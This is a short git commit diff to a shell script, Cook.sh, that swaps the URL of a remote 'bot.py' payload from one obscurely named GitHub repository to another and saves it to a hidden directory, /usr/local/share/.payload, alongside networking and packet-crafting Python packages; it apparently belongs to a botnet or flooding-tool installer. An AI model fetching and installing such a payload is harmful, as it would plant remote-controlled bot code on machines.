f3d34bee4ba4666f2faceb39b96229b372e23b62
Peppe12367 <153301057+Peppe12367@users.noreply.github.com>
2025-07-07 18:54:59 +0200

    Update Cook.sh

--- Cook.sh
+++ Cook.sh
@@ -1,5 +1,5 @@
 PYTHON_PACKAGES="cloudscraper requests pysocks scapy icmplib"
-PAYLOAD_URL="https://raw.githubusercontent.com/Peppe12367/-2272---2-72-/refs/heads/main/bot.py"
+PAYLOAD_URL="https://raw.githubusercontent.com/Peppe12367/73HSJ827-7---/refs/heads/main/bot.py"
 
 PAYLOAD_DIR="/usr/local/share/.payload"
 PAYLOAD_PATH="${PAYLOAD_DIR}/bot.py"
